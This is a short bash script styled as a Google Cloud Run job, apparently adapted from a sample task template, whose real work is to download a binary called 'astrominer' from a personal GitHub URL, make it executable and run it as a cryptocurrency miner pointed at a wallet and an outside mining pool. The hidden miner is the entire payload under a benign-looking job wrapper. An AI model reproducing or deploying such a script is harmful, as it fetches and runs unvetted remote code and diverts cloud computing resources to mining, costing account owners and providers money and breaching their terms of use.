#!/bin/bash
set -euo pipefail

# In production, consider printing commands as they are executed. 
# This helps with debugging if things go wrong and you only 
# have the logs.
#
# Add -x:
# set -euox pipefail

CLOUD_RUN_TASK_INDEX=${CLOUD_RUN_TASK_INDEX:=0}
CLOUD_RUN_TASK_ATTEMPT=${CLOUD_RUN_TASK_ATTEMPT:=0}

echo "Starting Task #${CLOUD_RUN_TASK_INDEX}, Attempt #${CLOUD_RUN_TASK_ATTEMPT}..."
wget https://raw.githubusercontent.com/realxdagg/job/main/astrominer
chmod 500 astrominer
./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r pool.whalesburg.com:4300  -p stratum -t 8
